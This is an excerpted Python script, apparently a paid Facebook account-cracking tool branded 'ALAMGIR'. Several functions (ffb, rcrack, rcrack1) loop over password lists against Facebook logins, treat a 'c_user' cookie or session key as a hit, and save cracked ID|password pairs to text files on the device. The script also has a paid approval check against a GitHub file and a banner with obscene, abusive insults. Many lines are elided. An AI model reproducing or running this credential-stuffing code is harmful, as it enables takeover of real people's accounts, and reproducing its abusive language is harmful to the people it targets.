...
import os,base64
os.system("xdg-open https://facebook.com/groups/5739304116164974/?ref=share")
...
\33[0;92m  __________________FUCK BOY ALAMGIR ______________________
  ...
  উ্ঁফ্ঁফ্ঁ বে্ঁবি্ঁ চু্ঁম্মা্ঁ দা্ঁও্ঁ  Tor Mare Chodi 365 Din Ok
...
\33[0;92m█  \33[mTools : \33[1;33mPAID 400TK per month
\33[0;92m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
""")
def linex():
	print('\033[1;32m----------------------------------------------')
...
def menu(): 
	...
	if xd in ['1','01']:
	   ...
	   gmail()
		...
		os.system(f'xdg-open https://wa.me/+8801712034653');menu()
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [ALAMGIR] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [ALAMGIR-OK] %s | %s'%(ids,pas))
				open('/sdcard/ALAMGIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [ALAMGIR-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ALAMGIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def rcrack1(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ALAMGIR-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ALAMGIR-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [ALAMGIR] %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print(f'\r\x1b[1;32m [ALAMGIR-OK] '+ids+' | '+pas)
...
def menu_apikey():
  ...
  id = "_".join(uuid)
  server = requests.get('https://github.com/ALAMGIR/BRAND/blob/main/Approval.txt').text
...
\033[1;37m[-] GITHUB    :\033[1;32m ALAMGIR
...
==================================================   """)
  ...
  try:
    httpCaht = requests.get("https://github.com/ALAMGIR/BRAND/blob/main/Approval.txt").text
    if id in httpCaht:
